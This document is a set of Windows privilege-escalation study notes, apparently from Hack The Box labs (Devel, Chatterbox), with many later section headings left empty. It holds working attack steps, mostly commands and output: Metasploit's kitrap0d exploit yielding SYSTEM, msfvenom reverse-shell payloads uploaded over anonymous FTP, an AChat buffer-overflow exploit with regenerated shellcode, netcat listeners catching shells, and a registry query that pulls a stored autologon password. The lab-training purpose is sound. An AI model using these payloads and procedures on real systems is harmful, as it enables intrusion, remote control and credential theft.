
## Kernel Exploits

1. Find out from the suggester that its vulnerable with kitrapod so, use metasploit exploit to get shell.  #devel-htb
```
msf6 exploit(multi/handler) > use exploit/windows/local/ms10_015_kitrap0d 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 4
session => 4
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost tun1
lhost => 10.10.16.4
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost 5555
lhost => 5555
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.16.4:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 2964 launched.
[*] Reflectively injecting the DLL into 2964...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176198 bytes) to 10.10.10.5
[*] Meterpreter session 5 opened (10.10.16.4:4444 -> 10.10.10.5:49235) at 2024-02-25 04:10:28 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

2. Manual way. 
```
1. Generate payload
┌──(kali㉿kali)-[~/PNPT/winesc]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=4242 -f aspx -o manual.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2729 bytes
Saved as: manual.aspx

2. Upload in ftp
──(kali㉿kali)-[~/PNPT/winesc]
└─$ ftp anonymous@10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> del manual.aspx
250 DELE command successful.
ftp> put manual.aspx 
local: manual.aspx remote: manual.aspx
229 Entering Extended Passive Mode (|||49243|)
125 Data connection already open; Transfer starting.
100% |************************************************|  2767       16.59 MiB/s    --:-- ETA
226 Transfer complete.
2767 bytes sent in 00:00 (15.33 KiB/s)
ftp> exit
221 Goodbye.

3. Receive reverse shell
┌──(kali㉿kali)-[~/PNPT/winesc]
└─$ sudo nc -nvlp 4242
listening on [any] 4242 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.5] 49244
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

## Passwords and Port Forwarding

#### Initial foothold. 
1. Nmap and rustscan #Chatterbox-htb
```
9255/tcp open  http    AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
```

2. Searchsploit result and download. 
```
┌──(kali㉿kali)-[~/PNPT/winesc]
└─$ searchsploit achat                         
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                                 | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                                    | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                                       | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                                         | php/webapps/24647.txt
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[~/PNPT/winesc]
└─$ searchsploit -m 36025.py 
```

3. Preparing exploit with changes. 36025.py
```
1. Change execution with reverse shell (line 9)
windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=443

2. generate own payload and replace bytes. 
┌──(kali㉿kali)-[~/PNPT]
└─$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=443 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python

3. Change targe ip (line 82)
server_address = ('10.10.10.74', 9256)
```

3. Run exploit and obtained reverse shell. 
```
┌──(kali㉿kali)-[~/PNPT/winesc]
└─$ python2 36025.py
---->{P00F}!

┌──(kali㉿kali)-[~/PNPT/winesc]
└─$ nc -nvlp 443                     
listening on [any] 443 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.74] 49158
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>



C:\Windows\system32>req query HKLM /f password /t REG_SZ /s
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    DefaultPassword    REG_SZ    Welcome1!


C:\Windows\system32>reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    ShutdownWithoutLogon    REG_SZ    0
    WinStationsDisabled    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    scremoveoption    REG_SZ    0
    ShutdownFlags    REG_DWORD    0x11
    DefaultDomainName    REG_SZ    
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!
```


## Windows Subsystem for Linux



## Impersonation and Potato Attacks



## Getsystem



## Runas 



## Additional Labs 



## Registry



## Executable Files



## startup Applications 



## DLL Hijacking



## Service Permissions (Paths)



## CVE-2019-1388